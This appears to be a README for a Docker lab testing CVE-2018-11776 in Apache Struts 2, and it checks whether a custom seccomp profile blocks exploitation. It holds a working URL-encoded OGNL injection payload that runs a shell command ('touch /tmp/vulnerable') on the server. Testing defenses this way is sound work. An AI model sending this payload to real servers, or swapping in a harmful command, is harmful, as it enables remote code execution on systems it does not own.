
Container: bhdresh/cve-2018-11776:1.0 <br>
Run: ```sudo docker run -it -p 8080:8080 bhdresh/cve-2018-11776:1.0 ```<br>

Exploit will create vuln file in /tmp simply append this PoC: <br>
```
:8080/struts2-showcase-2.3.14/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27touch /tmp/vulnerable%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/help.action
```

Use custom seccomp profile and check that exploit does not work. <br>
Run: ``` sudo docker run -it --security-opt seccomp=./apache.json -p 8080:8080 bhdresh/cve-2018-11776:1.0```
